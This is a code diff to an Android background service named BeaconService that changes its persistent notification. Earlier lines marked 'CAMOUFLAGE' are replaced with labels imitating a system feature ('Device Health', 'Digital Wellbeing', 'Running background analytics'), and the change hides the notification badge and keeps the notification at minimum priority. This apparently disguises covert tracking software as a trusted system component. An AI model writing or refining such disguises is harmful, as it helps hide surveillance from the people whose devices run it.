@@ -50,17 +50,16 @@ class BeaconService : Service() {
     }
 
     private fun createNotification(): Notification {
-        val channelId = "sync_service" // Changed ID
+        val channelId = "sync_service"
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-            // CAMOUFLAGE: Channel name
-            val chan = NotificationChannel(channelId, "Data Sync", NotificationManager.IMPORTANCE_MIN)
+            val chan = NotificationChannel(channelId, "Device Health", NotificationManager.IMPORTANCE_MIN)
+            chan.setShowBadge(false)
             getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
         }
         return NotificationCompat.Builder(this, channelId)
-            // CAMOUFLAGE: Notification text
-            .setContentTitle("Synchronizing data")
-            .setContentText("Backing up usage statistics...")
-            .setSmallIcon(android.R.drawable.stat_sys_upload)
+            .setContentTitle("Digital Wellbeing")
+            .setContentText("Running background analytics")
+            .setSmallIcon(android.R.drawable.ic_menu_recent_history)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .build()
